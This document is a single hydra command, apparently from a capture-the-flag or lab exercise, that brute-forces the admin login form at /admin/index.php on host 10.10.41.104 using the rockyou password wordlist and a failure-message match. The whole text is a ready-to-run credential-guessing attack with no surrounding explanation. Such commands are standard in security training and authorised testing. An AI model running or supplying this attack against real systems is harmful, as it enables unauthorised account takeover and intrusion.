
```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.41.104 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```